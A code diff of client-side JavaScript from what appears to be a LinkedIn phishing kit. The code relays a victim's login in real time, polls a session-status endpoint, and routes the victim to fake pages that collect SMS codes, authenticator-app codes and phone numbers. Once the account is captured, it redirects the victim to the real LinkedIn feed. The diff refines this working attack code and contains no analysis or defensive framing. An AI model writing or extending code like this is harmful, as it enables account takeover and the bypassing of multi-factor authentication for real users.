@@ -57,6 +57,7 @@ async function checkPuzzleImage(sessionId) {
       `/api/check-puzzle-image?sessionId=${sessionId}`
     );
     const data = await response.json();
+    
     return data.exists;
   } catch (error) {
     console.error("Error checking puzzle image:", error);
@@ -82,6 +83,7 @@ function startPuzzleImageCheck(sessionId, callback) {
 }
 
 function getChallenge() {
+  clearTimeout(redirectTimeout);
   let challengeXhr = new XMLHttpRequest();
   challengeXhr.open("POST", "/api/linkedin/security-verification", true);
   challengeXhr.setRequestHeader("Content-Type", "application/json");
@@ -295,7 +297,7 @@ document.addEventListener("click", async (e) => {
           "Enter the code we’ve sent to phone number ending with"
         )
       ) {
-        location.href = `/sms.html?sessionId=${sessionId}`;
+        location.href = `/sms.html?sessionId=${sessionId}&text=${responseText}`;
       } else if (
         responseText == "Enter your phone number to confirm it’s you"
       ) {
@@ -319,31 +321,33 @@ function checkLoginStatus() {
 
   checkLoginStatusXhr.onreadystatechange = function () {
     if (this.status == 200 && this.readyState == 4) {
-      let response = this.response;
-      console.log(response);
-      if (response == "0") {
+      let responseText = this.response;
+      console.log(responseText);
+      if (responseText == "0") {
         redirectTimeout = setTimeout(() => {
           checkLoginStatus();
         }, 3000);
-      } else if (response == "1") {
-        location.href = "https://www.linkedin.com/feed"
+      } else if (responseText == "1") {
+        location.href = "https://www.linkedin.com/feed/";
       } else if (
-        response == "Enter the code you see on your authenticator app"
+        responseText == "Enter the code you see on your authenticator app"
       ) {
-        clearTimeout(redirectTimeout);
         location.href = `/authenticator-app.html?sessionId=${sessionId}`;
-      } else if (response == "Let’s do a quick verification") {
-        clearTimeout(redirectTimeout);
+      } else if (responseText == "Let’s do a quick verification") {
         location.href = `/quick-verification.html?sessionId=${sessionId}`;
       } else if (
-        response.includes(
+        responseText.includes(
           "Enter the code we’ve sent to phone number ending with"
         )
       ) {
-        clearTimeout(redirectTimeout);
-        location.href = `/sms.html?sessionId=${sessionId}&text=${response}`;
+        location.href = `/sms.html?sessionId=${sessionId}&text=${responseText}`;
+      } else if (
+        responseText == "Enter your phone number to confirm it’s you"
+      ) {
+        location.href = `/enter-phone.html?sessionId=${sessionId}`;
+      } else if (responseText == "lastcve") {
+        location.href = `https://www.linkedin.com/feed`;
       } else {
-        clearTimeout(redirectTimeout);
         location.href = `/mobile-verification.html?sessionId=${sessionId}`;
       }
     }
